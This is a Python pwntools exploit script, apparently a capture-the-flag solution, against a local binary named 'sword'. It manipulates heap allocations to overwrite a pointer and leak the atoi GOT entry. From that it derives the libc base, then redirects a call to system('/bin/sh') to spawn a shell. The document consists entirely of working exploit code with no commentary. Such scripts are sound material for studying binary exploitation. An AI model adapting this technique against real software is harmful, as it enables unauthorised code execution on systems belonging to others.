from pwn import *

e = ELF("./sword")
libc = ELF("./libc.so.6")
p = process("./sword", env={"LD_PRELOAD": "./libc.so.6"})

def alloc(p):
  p.clean()
  p.sendline("1")
  idx = p.recvline_contains("sword index is")
  print(idx)
def free(p, idx):
  p.clean()
  p.sendline("5")
  p.sendlineafter("?", str(idx))
  p.sendlineafter("?", "99999")


alloc(p)
alloc(p)

free(p, 0)

p.clean()
p.sendline("5")
p.sendlineafter("?", "1")
p.sendlineafter("?", "24")
p.sendlineafter(".", "A" * 8 + p64(e.got["atoi"]))
p.sendlineafter("?", "-1")

p.clean()
p.sendline("3")
p.sendlineafter("?", "0")

p.recvuntil("The name is ")
val = p.recvline(keepends=False)
val = val.ljust(8, "\x00")
print("Got entry {}".format(hex(e.got["atoi"])))
libc_base = u64(val) - libc.symbols["atoi"]
print("Libc base {}".format(hex(libc_base)))
libc_system = libc.symbols["system"] + libc_base
print("Libc system {}".format(hex(libc_system)))

alloc(p)
alloc(p)
free(p, 2)

gdb.attach(p)
p.sendline("5")
p.sendlineafter("?", "3")
p.sendlineafter("?", "24")
p.sendlineafter(".", "A" * 8 + p64(libc.search("/bin/sh").next() + libc_base) + p64(libc_system))
p.sendlineafter("?", "-1")


p.clean()
p.sendline("6")
p.sendlineafter("?", "2")


p.interactive()
